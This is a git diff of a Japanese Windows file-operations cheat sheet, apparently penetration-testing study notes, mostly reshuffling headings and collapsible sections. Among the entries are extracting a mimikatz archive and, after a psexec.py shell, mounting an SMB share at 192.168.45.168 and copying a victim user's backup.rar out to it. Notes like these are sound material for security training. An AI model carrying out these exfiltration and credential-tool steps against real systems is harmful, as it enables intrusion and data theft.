@@ -3,10 +3,10 @@ title: File操作
 parent: Windows
 grand_parent: General
 ---
-
+# ファイルの中身
 <details markdown="1">
 <summary>type,gc</summary>
-# ファイルの中身
+
 ## type
 ```cmd
 type hoge.txt
@@ -20,12 +20,10 @@ gc nsclient.ini
 </details>
 
 ---
-
+# ファイル探索
 <details markdown="1">
 <summary>findstr</summary>
-# ファイル探索
 
-##### findstr
 ```bash
 C:\>tasklist | findstr CloudMe
 
@@ -37,10 +35,12 @@ tasklist | findstr /V CloudMe
 ```bash
 Expand-Archive -Path .\mimikatz.zip
 ```
-
+</details>
 # Share
 
-## net use
+<details markdown="1">
+<summary>net use</summary>
+
 net use + copy を使う（psexec で実現する方法）
 
 psexec.py でシェルが出たら SMB マウントしてコピーできます。
@@ -73,3 +73,18 @@ OK     F:         \\\\192.168.45.168\\offsec
 PS C:\\Users\\victor\\Downloads> cd F:
 PS F:\\> cp C:\\Users\\victor\\Downloads\\backup.rar ./
 ```
+</details>
+
+---
+# コンパイル
+
+<details markdown="1">
+<summary>gcc</summary>
+```bash
+gcc hello.c -o hello.exe
+```
+# 証明書
+<details markdown="1">
+<summary>証明書のインポート</summary>
+［スタート］→［ファイル名を指定して実行］をクリックし、名前の枠に「certmgr.msc」と入力して［OK］をクリックします。証明書管理画面が表示されますので、[信頼されたルート証明機関]の証明書フォルダを右クリックして、「すべてのタスク」から「インポート」を選択します
+</details>
